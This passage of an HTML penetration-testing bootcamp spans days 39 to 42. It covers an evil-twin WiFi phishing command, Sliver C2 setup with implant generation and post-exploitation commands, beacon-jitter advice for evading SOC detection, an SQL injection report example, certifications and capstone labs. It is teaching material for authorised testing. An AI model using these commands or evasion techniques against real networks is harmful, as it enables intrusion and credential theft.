+<span class="pr">kali$</span> <span class="cm">sudo wifiphisher -aI wlan0 -jI wlan1 --phishing-pages firmware-upgrade</span>
+<span class="co"># wlan0 = deauth + jamming, wlan1 = evil twin AP
+# "firmware-upgrade" = presents fake router firmware update page
+# Victim enters WiFi password to "update firmware" → you capture it</span></div>
+  </div>
+
+  <div class="slbl">// DAY 39 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You run a deauthentication attack against a WPA2 network but airodump-ng doesn't capture a handshake. The BSSID shows active clients. What are the two most likely causes and how do you address each?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','WPA3 uses SAE (Simultaneous Authentication of Equals) which is handshake-less — but if airodump shows WPA2 in the encryption column, it\'s still WPA2.')"><span class="qk">A</span> The network uses WPA3 which doesn't have a crackable handshake</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Two causes: (1) Wrong channel — your adapter is scanning a different channel than the AP is broadcasting on. Fix: add -c [channel] to your airodump-ng command using the exact channel shown in the first airodump sweep. (2) Deauth not reaching clients — you\'re too far from the clients, or the adapter isn\'t injecting properly. Fix: verify injection capability first (aireplay-ng --test wlan0mon), get closer to the target, or increase deauth packet count (--deauth 100 instead of 10). Also: some modern clients (iOS, macOS with protected management frames — PMF/802.11w) ignore deauth packets. For PMF-protected clients, the PMKID attack (hcxdumptool) is better since it works without deauthenticating clients at all.')"><span class="qk">B</span> Wrong channel specified (adapter scanning different channel than AP) or deauth packets not reaching clients (distance/PMF protection) — fix with -c flag and test injection first</div>
+      <div class="qo" onclick="qa(this,'wrong','Enterprise WPA2 (802.1X/RADIUS) doesn\'t produce the same handshake format, but airodump would show WPA2 CCMP MGMT in the encryption column rather than WPA2 CCMP PSK.')"><span class="qk">C</span> WPA2 Enterprise can\'t be captured — it requires a RADIUS server that blocks handshakes</div>
+      <div class="qo" onclick="qa(this,'wrong','Aircrack-ng is for cracking, not capturing. If airodump isn\'t capturing the handshake, the problem is at the capture stage, not the cracking stage.')"><span class="qk">D</span> You need to run aircrack-ng simultaneously — airodump alone can\'t capture handshakes</div>
+    </div>
+    <div class="qfb" id="q3"></div>
+  </div>
+</div><!-- /p3 -->
+
+
+<!-- ═══════════ DAY 40 ═══════════ -->
+<div class="pnl" id="p4">
+  <div class="dh">
+    <div class="dnum">40</div>
+    <div class="dinfo">
+      <h2>C2 Frameworks</h2>
+      <p><span class="stag stl">TOOL</span><span class="stag slb">LAB</span> Sliver · Havoc · Empire · C2 Infrastructure · Listener Setup</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 6 PROGRESS — DAY 40 OF 42</div><div class="pbt"><div class="pbf" style="width:95%"></div></div></div>
+
+  <div class="note nv">
+    <div class="nico">🕸️</div>
+    <p><strong>C2 frameworks replace Metasploit's Meterpreter for professional red team engagements.</strong> Modern enterprise defenses flag Meterpreter signatures. Real red teams use custom or less-known C2 frameworks with encrypted, authenticated communication channels that blend into normal HTTPS traffic. Sliver (BishopFox) and Havoc are free and actively maintained.</p>
+  </div>
+
+  <div class="slbl">// 40.1 — C2 FRAMEWORK COMPARISON</div>
+  <div class="c2-cards">
+    <div class="c2-card sliver">
+      <div class="c2-name">Sliver</div>
+      <div class="c2-meta">BishopFox · Open Source · Go</div>
+      <div class="c2-desc">Modern, actively maintained, designed to replace Cobalt Strike in red team toolkits. mTLS, HTTP/S, DNS, WireGuard C2 channels. Multiplayer team server.</div>
+      <div class="c2-feat">Best free option for learning. Generate implants in seconds. Built-in BOF support. Start here.</div>
+    </div>
+    <div class="c2-card havoc">
+      <div class="c2-name">Havoc</div>
+      <div class="c2-meta">Open Source · C/C++ · GUI</div>
+      <div class="c2-desc">Post-exploitation framework with GUI reminiscent of Cobalt Strike. Daemon architecture, sleep obfuscation, process injection, BOF execution.</div>
+      <div class="c2-feat">Strong EDR evasion features. Active development. Good Cobalt Strike alternative for learning enterprise-grade C2.</div>
+    </div>
+    <div class="c2-card cs">
+      <div class="c2-name">Cobalt Strike</div>
+      <div class="c2-meta">Commercial · $5,900/yr · Java</div>
+      <div class="c2-desc">The industry standard used by APT groups and red teams alike. Beacons, Malleable C2 profiles, BOF, OPSEC-safe post-exploitation. Your goal to learn eventually.</div>
+      <div class="c2-feat">Required skill for senior red team roles. Trial available. Cracked versions used by real APTs — understand both sides.</div>
+    </div>
+    <div class="c2-card empire">
+      <div class="c2-name">Empire / Starkiller</div>
+      <div class="c2-meta">Open Source · Python/PowerShell</div>
+      <div class="c2-desc">PowerShell and Python agents. HTTP/S, SMTP, Dropbox C2 channels. Extensive module library for post-exploitation and AD attacks.</div>
+      <div class="c2-feat">Great for PowerShell-focused engagements. Pre-built AD attack modules. Well-documented for learning.</div>
+    </div>
+    <div class="c2-card cov">
+      <div class="c2-name">Covenant / Brute Ratel</div>
+      <div class="c2-meta">C# / Commercial</div>
+      <div class="c2-desc">Covenant: free C# .NET framework, good for Windows environments. Brute Ratel C4: commercial, $2,500/yr — specifically designed to evade modern EDR.</div>
+      <div class="c2-feat">Covenant good for learning C# tradecraft. BRC4 is what advanced red teams use for hardened Windows environments.</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 40.2 — SLIVER C2: SETUP AND OPERATION</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">SLIVER C2 — INSTALLATION, LISTENER, IMPLANT, OPERATION</div></div>
+    <div class="tbody"><span class="co"># ── INSTALL SLIVER SERVER ─────────────────────────────────────</span>
+<span class="pr">kali$</span> <span class="cm">curl https://sliver.sh/install | sudo bash</span>
+<span class="pr">kali$</span> <span class="cm">sudo systemctl start sliver</span>
+<span class="pr">kali$</span> <span class="cm">sliver</span>
+<span class="hl2">
+          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
+        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
+        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
+          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
+        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
+
+sliver ></span>
+
+<span class="co"># ── START HTTPS LISTENER ──────────────────────────────────────</span>
+<span class="pr">sliver ></span> <span class="cm">https --lhost 192.168.56.100 --lport 443</span>
+<span class="hl2">[*] Starting HTTPS :443 listener ...</span>
+
+<span class="co"># ── GENERATE IMPLANT (BEACON) ─────────────────────────────────</span>
+<span class="pr">sliver ></span> <span class="cm">generate --mtls 192.168.56.100 --os windows --arch amd64 --format exe --save /tmp/implant.exe</span>
+<span class="co"># Options: --os windows/linux/macos --format exe/shared/shellcode/service
+# --sleep 30 --jitter 10  = beacon every 30s ±10s (more realistic, less noisy)</span>
+
+<span class="co"># ── EXECUTE ON TARGET, RECEIVE SESSION ───────────────────────</span>
+<span class="hl2">[*] Session 4b3a8c12 WISE_BADGER - 192.168.56.101:51234 (WIN-TARGET) - windows/amd64</span>
+
+<span class="pr">sliver ></span> <span class="cm">sessions</span>
+<span class="hl2">ID        Name          Transport  Remote Address      OS/Arch        Last Message
+4b3a8c12  WISE_BADGER   mtls       192.168.56.101      windows/amd64  3s</span>
+
+<span class="pr">sliver ></span> <span class="cm">use 4b3a8c12</span>
+<span class="pr">sliver (WISE_BADGER) ></span> <span class="cm">whoami</span>
+<span class="hl2">CORP\Administrator</span>
+
+<span class="co"># ── KEY SLIVER COMMANDS ───────────────────────────────────────</span>
+<span class="pr">sliver (WISE_BADGER) ></span> <span class="cm">shell</span>          <span class="co"># Interactive shell</span>
+<span class="pr">sliver (WISE_BADGER) ></span> <span class="cm">ps</span>             <span class="co"># List processes</span>
+<span class="pr">sliver (WISE_BADGER) ></span> <span class="cm">migrate --pid 4892</span>  <span class="co"># Process migration</span>
+<span class="pr">sliver (WISE_BADGER) ></span> <span class="cm">upload /opt/winpeas.exe C:\\Temp\\wp.exe</span>
+<span class="pr">sliver (WISE_BADGER) ></span> <span class="cm">execute-assembly /opt/Rubeus.exe "kerberoast /outfile:hashes.txt"</span>
+<span class="co"># execute-assembly: run .NET assemblies in memory — never touches disk</span></div>
+  </div>
+
+  <div class="slbl">// DAY 40 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">Your Sliver HTTPS beacon is communicating fine but the SOC detects it based on network traffic patterns — beaconing every exactly 30 seconds creates a suspicious regular pattern. How do you fix this without losing your session?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Switching to DNS C2 would require redeploying a new implant — you\'d lose the current session. Also, DNS beaconing has its own detection signatures (unusual DNS query patterns).')"><span class="qk">A</span> Switch to DNS C2 immediately — HTTPS beaconing is always detectable</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Sliver supports sleep/jitter settings on active sessions without redeployment. In the active session: sleep 60 --jitter 30 — the beacon now sleeps 60 seconds ±30 seconds randomly (anywhere from 30 to 90 seconds). This breaks the regular pattern that IDS/behavioral tools flag. Additionally: (1) Use a Malleable C2 profile to make the HTTP/S traffic look like legitimate browser traffic (matching Google Analytics or Microsoft update request patterns). (2) Increase sleep times significantly (5-15 minute intervals) — more OPSEC safe at the cost of responsiveness. (3) Consider switching to an interactive session only when needed, running as beacon otherwise. The core principle: randomized beaconing that mimics legitimate background traffic intervals.')"><span class="qk">B</span> Set jitter on the active session (<code>sleep 60 --jitter 30</code>) to randomize beacon intervals without losing the session</div>
+      <div class="qo" onclick="qa(this,'wrong','Increasing frequency would make the detection worse — more regular pattern, more noise. The goal is less frequent and more random.')"><span class="qk">C</span> Increase beacon frequency to every 5 seconds — faster beacons are harder for IDS to correlate</div>
+      <div class="qo" onclick="qa(this,'wrong','Killing the implant ends your access — the session is gone. OPSEC discipline means evading detection while maintaining access, not abandoning it.')"><span class="qk">D</span> Kill the implant and wait for the SOC to stop watching, then redeploy</div>
+    </div>
+    <div class="qfb" id="q4"></div>
+  </div>
+</div><!-- /p4 -->
+
+
+<!-- ═══════════ DAY 41 ═══════════ -->
+<div class="pnl" id="p5">
+  <div class="dh">
+    <div class="dnum">41</div>
+    <div class="dinfo">
+      <h2>Professional Report Writing</h2>
+      <p><span class="stag sth">THEORY</span> Executive Summary · Technical Detail · CVSS · Remediation · Deliverables</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 6 PROGRESS — DAY 41 OF 42</div><div class="pbt"><div class="pbf" style="width:98%"></div></div></div>
+
+  <div class="note nv">
+    <div class="nico">📋</div>
+    <p><strong>The report is the product.</strong> A client pays for your findings in written form — the exploitation itself is just the research. A flawless pentest with a poor report pays nothing and helps nobody. A clearly written report that turns complex findings into actionable business decisions is what separates a $50/hour contractor from a $200/hour consultant. Learn to write both the executive view and the technical depth.</p>
+  </div>
+
+  <div class="slbl">// 41.1 — REPORT STRUCTURE</div>
+  <div class="report-sections">
+    <div class="rs"><div class="rs-label">1. Cover Page</div><div class="rs-desc">Client name, engagement type (Internal PT / Web App / Red Team), date range, classification (CONFIDENTIAL), version, author, reviewer. Keep professional — this is a legal document.</div></div>
+    <div class="rs"><div class="rs-label">2. Executive Summary</div><div class="rs-desc">1–2 pages for non-technical executives. What was tested, what was found in plain English, overall risk posture, top 3 priorities. No technical jargon. CEO must understand this without the appendix.</div></div>
+    <div class="rs"><div class="rs-label">3. Scope & Methodology</div><div class="rs-desc">Exact IP ranges, domains, dates tested, tools used, team members, rules of engagement, what was excluded and why. This is your legal protection — defines what you were authorized to do.</div></div>
+    <div class="rs"><div class="rs-label">4. Risk Rating Summary</div><div class="rs-desc">Dashboard table: Critical (N), High (N), Medium (N), Low (N), Informational (N). Trend if retesting. Pie chart optional. Executives scan this first.</div></div>
+    <div class="rs"><div class="rs-label">5. Findings (main body)</div><div class="rs-desc">One section per finding. Ordered by severity. Each finding: Title, Severity (CVSS), Affected Asset, Description, Evidence (screenshots + commands), Business Impact, Remediation Steps.</div></div>
+    <div class="rs"><div class="rs-label">6. Attack Narrative</div><div class="rs-desc">Story of how you moved through the environment. "We started at X, found Y, used it to reach Z." Tells the story from attacker's perspective. Makes the risk concrete and real to technical staff.</div></div>
+    <div class="rs"><div class="rs-label">7. Remediation Roadmap</div><div class="rs-desc">Prioritized fix list with timelines: Critical (24-72 hours), High (30 days), Medium (90 days), Low (next cycle). Include effort estimates. Gives them an actionable plan, not just problems.</div></div>
+    <div class="rs"><div class="rs-label">8. Appendices</div><div class="rs-desc">Full tool output, raw scan data, proof-of-concept code, detailed exploit steps. Technical staff use this for reproduction and verification. Keep this separate so it doesn't overwhelm the main report.</div></div>
+  </div>
+
+  <div class="slbl">// 41.2 — WRITING INDIVIDUAL FINDINGS</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">FINDING TEMPLATE — SQL INJECTION EXAMPLE</div></div>
+    <div class="tbody"><span class="ha">Finding #003: SQL Injection — Authentication Bypass</span>
+<span class="ham">Severity: Critical | CVSS 3.1 Score: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</span>
+<span class="hb">Affected Asset: https://crm.corp.com/login (Production CRM System)</span>
+
+<span class="hg">Description:</span>
+<span class="co">The login form at https://crm.corp.com/login is vulnerable to SQL injection
+via the username parameter. User-supplied input is directly concatenated into
+a SQL query without sanitization or parameterized queries.</span>
+
+<span class="hg">Evidence:</span>
+<span class="co">Request sent:
+  POST /login HTTP/1.1
+  Host: crm.corp.com
+  username=admin'--&password=anything
+
+Server response: HTTP/1.1 302 Found → /dashboard
+(Authenticated as administrator without valid password)</span>
+
+<span class="hg">Business Impact:</span>
+<span class="hc">An unauthenticated attacker can bypass authentication and access the CRM system
+as any user including administrators, exposing 127,000 customer records
+(PII including payment data). This constitutes a GDPR data breach if exploited.</span>
+
+<span class="hg">Remediation:</span>
+<span class="hl2">IMMEDIATE (24 hours):
+  1. Implement parameterized queries / prepared statements in all database calls
+  2. Remove or disable the /login endpoint until patched
+  3. Audit application logs for signs of prior exploitation
+
+SHORT-TERM (30 days):
+  4. Deploy WAF rule to block SQL metacharacters in login fields
+  5. Conduct code review of all database interaction points
+  6. Implement least-privilege database accounts (no DROP/ALTER permission)</span>
+
+<span class="hg">References:</span>
+<span class="co">CWE-89: Improper Neutralization of Special Elements in SQL Command
+OWASP Top 10 2021 - A03: Injection
+CVSS 3.1 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span></div>
+  </div>
+
+  <div class="slbl">// 41.3 — EVIDENCE COLLECTION DISCIPLINE</div>
+  <div class="card">
+    <div class="clbl">DOCUMENT EVERYTHING — REAL TIME</div>
+    <p>The worst mistake is trying to recreate screenshots after the fact. Start a timestamped notes file at the beginning of every engagement. Screenshot every finding immediately. Record every command you run in a log file.</p>
+  </div>
+  <div class="two">
+    <div class="card">
+      <div class="clbl">WHAT TO CAPTURE</div>
+      <ul class="ck">
+        <li>Screenshot of the original request and vulnerable response</li>
+        <li>Screenshot of successful exploitation (proof of impact)</li>
+        <li>The exact command or payload used</li>
+        <li>Timestamp — date and time of finding</li>
+        <li>IP/hostname of affected system</li>
+        <li>User account context (what account you were)</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="clbl">TOOLS FOR NOTE-TAKING</div>
+      <ul class="ck">
+        <li><strong>Obsidian</strong> — Markdown with file attachments. Best for solo.</li>
+        <li><strong>Cherry Tree</strong> — Hierarchical notes. Pre-installed on Kali.</li>
+        <li><strong>Ghostwriter</strong> — Purpose-built pentest reporting platform.</li>
+        <li><strong>PlexTrac</strong> — Enterprise platform, team collaboration.</li>
+        <li><strong>script + timing</strong> — Record entire terminal session: <code>script -t session.log</code></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="slbl">// DAY 41 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">Your report shows you achieved Domain Admin access via: foothold → local admin → Kerberoasting → credential cracking → lateral movement → DA. The CISO says "this wouldn't happen in real life — too many steps." How do you respond?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Agreeing with the CISO without supporting evidence is not a professional response and leaves the client with a false sense of security.')"><span class="qk">A</span> Agree — acknowledge the attack chain was theoretical and may not reflect real risk</div>
+      <div class="qo" onclick="qa(this,'wrong','Demonstrating again is possible but misses the strategic point — the CISO needs business context and threat intelligence, not another technical demo.')"><span class="qk">B</span> Demonstrate the attack chain again live to prove it works</div>
+      <div class="qo" onclick="qa(this,'correct','Correct professional response: Cite real-world precedent — APT groups routinely use 5-10 hop attack chains. Present threat intelligence: the Colonial Pipeline attack, the SolarWinds supply chain attack, and every major AD compromise followed multi-step paths. Each individual step in your chain is well-documented by CISA, NSA, and Microsoft security advisories. Show that you followed the MITRE ATT&CK framework — a framework built from real attack data. Key point: the question isn\'t "would an attacker do this" but "does this path exist and can someone with moderate skill follow it?" Your engagement proved the answer is yes. Every individual vulnerability is real and individually reportable regardless of whether an attacker chains them.')"><span class="qk">C</span> Cite real APT attack chains (Colonial Pipeline, SolarWinds) showing multi-hop paths are standard, reference MITRE ATT&CK techniques used, and note each individual finding is valid regardless of chaining</div>
+      <div class="qo" onclick="qa(this,'wrong','Removing steps from your report would be dishonest and would reduce the quality of your deliverable. Document what actually happened — the full chain is the most valuable part.')"><span class="qk">D</span> Remove the middle steps from the report to make the chain look more direct and convincing</div>
+    </div>
+    <div class="qfb" id="q5"></div>
+  </div>
+</div><!-- /p5 -->
+
+
+<!-- ═══════════ DAY 42 — CAPSTONE ═══════════ -->
+<div class="pnl" id="p6">
+  <div class="dh">
+    <div class="dnum">42</div>
+    <div class="dinfo">
+      <h2>2-Month Capstone — You Made It</h2>
+      <p><span class="stag slb">CAPSTONE</span> Full Retrospective · Career Roadmap · Certifications · What's Next</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">BOOTCAMP — COMPLETE ✓✓✓</div><div class="pbt"><div class="pbf" style="width:100%"></div></div></div>
+
+  <div class="capstone-hero">
+    <div class="cap-title">bootcamp complete.</div>
+    <p class="cap-sub">42 days. 6 phases. From "what is the CIA Triad" to Golden Tickets, C2 frameworks, and professional report writing. You have built a foundation that most people in the industry took years to acquire.</p>
+    <div style="display:flex;gap:1.5rem;justify-content:center;flex-wrap:wrap;margin-top:1rem;">
+      <div style="text-align:center"><div style="font-family:var(--display);font-size:2rem;color:var(--accent)">42</div><div style="font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em">DAYS</div></div>
+      <div style="text-align:center"><div style="font-family:var(--display);font-size:2rem;color:var(--lime)">150+</div><div style="font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em">CONCEPTS</div></div>
+      <div style="text-align:center"><div style="font-family:var(--display);font-size:2rem;color:var(--cold)">60+</div><div style="font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em">TOOLS</div></div>
+      <div style="text-align:center"><div style="font-family:var(--display);font-size:2rem;color:var(--crimson)">4</div><div style="font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em">PHASES</div></div>
+    </div>
+  </div>
+
+  <div class="slbl">// 42.1 — COMPLETE 2-MONTH SKILL MAP</div>
+  <table class="tbl">
+    <tr><th>PHASE</th><th>WEEKS</th><th>CORE SKILLS BUILT</th></tr>
+    <tr><td><span class="hl">Phase 1: Foundations</span></td><td>1–2</td><td>CIA Triad, Linux/Windows fundamentals, networking protocols, Wireshark, cryptography, OSINT, Python scripting</td></tr>
+    <tr><td><span class="hlm">Phase 2: Enumeration</span></td><td>3–4</td><td>Nmap mastery, Gobuster/ffuf, Burp Suite, Metasploit, SQLi, XSS, CSRF, SSRF, XXE, IDOR, Hashcat, HackTheBox</td></tr>
+    <tr><td><span class="hbl">Phase 3: Advanced Offense</span></td><td>5–6</td><td>Linux/Windows privesc, Mimikatz, Kerberoasting, DCSync, Golden Ticket, lateral movement, AV evasion, C2 frameworks, wireless attacks</td></tr>
+    <tr><td><span class="ham2">Defense (embedded)</span></td><td>All</td><td>SIEM/Splunk, Snort rules, IDS/IPS, security headers, firewall rules, IR lifecycle, MITRE ATT&CK, purple team methodology</td></tr>
+  </table>
+
+  <div class="slbl">// 42.2 — CERTIFICATION ROADMAP</div>
+  <div class="cert-grid">
+    <div class="cert-card">
+      <div class="cert-name">CompTIA Security+</div>
+      <div class="cert-issuer">CompTIA · Exam: SY0-701</div>
+      <div class="cert-desc">Foundational certification — validates baseline security concepts. Required by many government and corporate roles. Take this first if you need a certification immediately.</div>
+      <div class="cert-diff d-entry">Entry Level</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-name">eJPT</div>
+      <div class="cert-issuer">INE Security</div>
+      <div class="cert-desc">Junior penetration tester certification. Practical exam — compromise a real network. A great first pentest cert that validates hands-on skills from Phases 1–2.</div>
+      <div class="cert-diff d-entry">Entry Level</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-name">PNPT</div>
+      <div class="cert-issuer">TCM Security · $399</div>
+      <div class="cert-desc">Practical Network Penetration Tester. 5-day exam simulating a real client engagement with a report. Covers everything in this bootcamp. Your immediate next target after completing labs.</div>
+      <div class="cert-diff d-inter">Intermediate</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-name">CEH</div>
+      <div class="cert-issuer">EC-Council</div>
+      <div class="cert-desc">Certified Ethical Hacker. Widely recognized in industry. More theory than practice — good for corporate hiring. Pair with practical certifications.</div>
+      <div class="cert-diff d-inter">Intermediate</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-name">OSCP</div>
+      <div class="cert-issuer">Offensive Security · $1,499</div>
+      <div class="cert-desc">The gold standard of offensive security. 24-hour practical exam — compromise multiple machines, write a report. Recognized globally as proof of real pentesting skill. Your 6-month goal.</div>
+      <div class="cert-diff d-adv">Advanced</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-name">BTL1</div>
+      <div class="cert-issuer">Security Blue Team</div>
+      <div class="cert-desc">Blue Team Level 1 — defensive counterpart to PNPT. Covers SIEM, threat intelligence, IR, and digital forensics. If you want to specialize in defense.</div>
+      <div class="cert-diff d-inter">Intermediate</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-name">CRTO</div>
+      <div class="cert-issuer">Zero-Point Security · £400</div>
+      <div class="cert-desc">Certified Red Team Operator. Focuses on AD attacks, Cobalt Strike, evasion. Covers Weeks 5–6 topics at advanced depth. After PNPT/OSCP.</div>
+      <div class="cert-diff d-adv">Advanced</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-name">OSEP / OSED / OSWE</div>
+      <div class="cert-issuer">Offensive Security</div>
+      <div class="cert-desc">Advanced Offensive Security certifications: OSEP (Evasion), OSED (Exploit Development), OSWE (Web Expert). Elite tier — pursue after OSCP.</div>
+      <div class="cert-diff d-elite">Elite</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 42.3 — YOUR ROADMAP FORWARD</div>
+  <div class="timeline">
+    <div class="tl-item">
+      <div class="tl-period">NOW → MONTH 3</div>
+      <div class="tl-title">Consolidate and Lab</div>
+      <div class="tl-desc">Complete all HackTheBox Starting Point machines. Finish TryHackMe "Jr Penetration Tester" path. Build your own Active Directory lab. Solve 20 HackTheBox easy machines. Start a GitHub portfolio documenting your methodology and tools.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-period">MONTH 3 → 5</div>
+      <div class="tl-title">Certify: eJPT → PNPT</div>
+      <div class="tl-desc">Take the eJPT first (easier, builds confidence, costs ~$200). Then take TCM Security's "Practical Ethical Hacking" course (if you haven't) and sit the PNPT. The PNPT report practice is direct preparation for real client work.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-period">MONTH 5 → 9</div>
+      <div class="tl-title">Bug Bounty + OSCP Prep</div>
+      <div class="tl-desc">Start bug bounty hunting on HackerOne or Bugcrowd — scope-limited, legal, real targets, potential income. Practice PortSwigger Web Academy labs completely. Begin Hack The Box Pro Labs (Offshore, RastaLabs) for AD practice. Prep for OSCP with TJnull's OSCP prep list.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-period">MONTH 9 → 12</div>
+      <div class="tl-title">OSCP + First Job</div>
+      <div class="tl-desc">Sit the OSCP exam. With PNPT + OSCP, you are hireable as a junior penetration tester. Start applying to security firms (NCC Group, Rapid7, Trustwave, Mandiant, smaller boutique firms). Expect $60k–$90k entry, $100k–$140k with OSCP in most markets.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-period">YEAR 2+</div>
+      <div class="tl-title">Specialize</div>
+      <div class="tl-desc">Red team (CRTO, OSEP), web security (BSCP), exploit development (OSED/OSCE3), cloud security (AWS/Azure cert), mobile security, or defensive (GCIA, GCFE, GCIH). The field is wide — follow what excites you most.</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 42.4 — FINAL CAPSTONE LABS</div>
+  <div class="card">
+    <div class="clbl">CAPSTONE LAB 1 — FULL AD COMPROMISE SIMULATION</div>
+    <ul class="ck">
+      <li>In your home lab (or TryHackMe "Holo" / HTB "RastaLabs"): start with zero credentials on an external machine and reach Domain Admin.</li>
+      <li>Document every step: initial recon → web exploit → foothold → enumeration → privesc → credential harvest → lateral movement → DA.</li>
+      <li>Map every technique to its MITRE ATT&CK ID.</li>
+      <li>Write a full professional pentest report for this simulated engagement. Include executive summary, all findings with CVSS scores, and remediation roadmap.</li>
+    </ul>
+  </div>
+  <div class="card">
+    <div class="clbl">CAPSTONE LAB 2 — PURPLE TEAM EXERCISE</div>
+    <ul class="ck">
+      <li>Run a Kerberoasting attack against your AD lab, then set up Splunk and write a detection rule that would catch it.</li>
+      <li>Execute a Pass-the-Hash lateral movement, then build a Sigma rule to detect it.</li>
+      <li>Simulate a Golden Ticket attack, then demonstrate how resetting krbtgt twice prevents it.</li>
+      <li>This is the purple team mindset: attack to understand, defend to prevent. The most valuable security professionals do both.</li>
+    </ul>
+  </div>
+  <div class="card">
+    <div class="clbl">CAPSTONE LAB 3 — HACKTHEBOX PRO LAB OR PNPT PREP</div>
+    <ul class="ck">
+      <li>HTB "Offshore" Pro Lab: Full AD environment with 17 machines. Most OSCP-like free experience available.</li>
+      <li>Or: TCM Security's "PNPT Practice Exam" — a full simulated engagement with feedback.</li>
+      <li>Or: VulnHub machines — "Kioptrix" series, "Vulnix", "DC-9" — all free, offline VMs.</li>
+      <li>Whatever you choose: write a report. Always write a report. The report is the product.</li>
+    </ul>
+  </div>
+
+  <div class="slbl">// 42.5 — COMMUNITIES, RESOURCES, AND STAYING CURRENT</div>
+  <div class="three">
+    <div class="card">
+      <div class="clbl">COMMUNITIES</div>
+      <ul class="ck">
+        <li>TryHackMe Discord — active, beginner-friendly</li>
+        <li>HackTheBox Forums + Discord</li>
+        <li>r/netsec, r/hacking, r/oscp</li>
+        <li>TCM Security Discord — PNPT community</li>
+        <li>Bloodhound Slack — AD security experts</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="clbl">STAY CURRENT</div>
+      <ul class="ck">
+        <li>Krebs on Security (krebsonsecurity.com)</li>
+        <li>Threatpost & Bleeping Computer (daily news)</li>
+        <li>NVD (nvd.nist.gov) — new CVEs daily</li>
+        <li>SANS Internet Storm Center</li>
+        <li>Follow security researchers on X/Twitter</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="clbl">PRACTICE PLATFORMS</div>
+      <ul class="ck">
+        <li>HackTheBox — best machines, best community</li>
+        <li>TryHackMe — guided paths, great for learning</li>
+        <li>PortSwigger Web Academy — best web security</li>
+        <li>VulnHub — offline VMs, no subscription</li>
+        <li>PentesterLab — web + code review focus</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="slbl">// FINAL QUIZ — 2-MONTH SYNTHESIS</div>
+  <div class="qb">
+    <div class="qt">A client hires you for an external pentest. Nmap finds only port 443 open on a single IP. The HTTPS site shows a login page for an internal CRM. Describe your complete testing approach from this starting point.</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','With only one port visible externally, there may be internal services — but you can\'t assume that without testing the available surface first.')"><span class="qk">A</span> Report that only one port is open — there is insufficient attack surface for a meaningful pentest</div>
+      <div class="qo" onclick="qa(this,'wrong','SQL injection is one test among many. Starting with a single vulnerability class misses the breadth required for a professional external assessment.')"><span class="qk">B</span> Run sqlmap against every visible login form immediately</div>
+      <div class="qo" onclick="qa(this,'correct','Correct full methodology: (1) PASSIVE RECON — theHarvester for subdomains/emails, Google dorks (site:target.com), Shodan/Censys, WHOIS, certificate transparency logs (crt.sh) to find all subdomains. (2) ACTIVE RECON — gobuster DNS for subdomain brute-force, gobuster dir on all discovered subdomains, nikto against each web service, full -p- nmap on the IP (often more ports visible than initial scan). (3) WEB APP TESTING — technology fingerprinting (WhatWeb), security headers analysis (curl -I), JavaScript source review for hidden endpoints, API discovery, Burp Suite spider and manual testing of all parameters. (4) AUTH TESTING — default credentials, username enumeration, password spraying with known breached credentials, MFA bypass testing. (5) VULNERABILITY TESTING — manual SQLi, XSS, IDOR (change user IDs), auth bypass, JWT analysis if applicable, CSRF on state-changing actions, SSRF via URL parameters. (6) BUSINESS LOGIC — what does the CRM do? Test all workflows: create record, update, delete, export, share — each might have its own IDOR or auth failure. Document everything with timestamps and screenshots.')"><span class="qk">C</span> Passive recon for all subdomains and emails, full port scan and directory brute-force, technology fingerprinting, manual Burp testing of all parameters, auth bypass, and business logic testing — documented throughout</div>
+      <div class="qo" onclick="qa(this,'wrong','Metasploit is primarily for known CVE exploitation against identified services. Against a web app with no identified CVE, Metasploit has limited utility compared to manual web application testing.')"><span class="qk">D</span> Run Metasploit against port 443 — it has web application exploit modules</div>
+    </div>
+    <div class="qfb" id="q6"></div>
+  </div>
+
+  <div class="note ng" style="margin-top:2rem;">
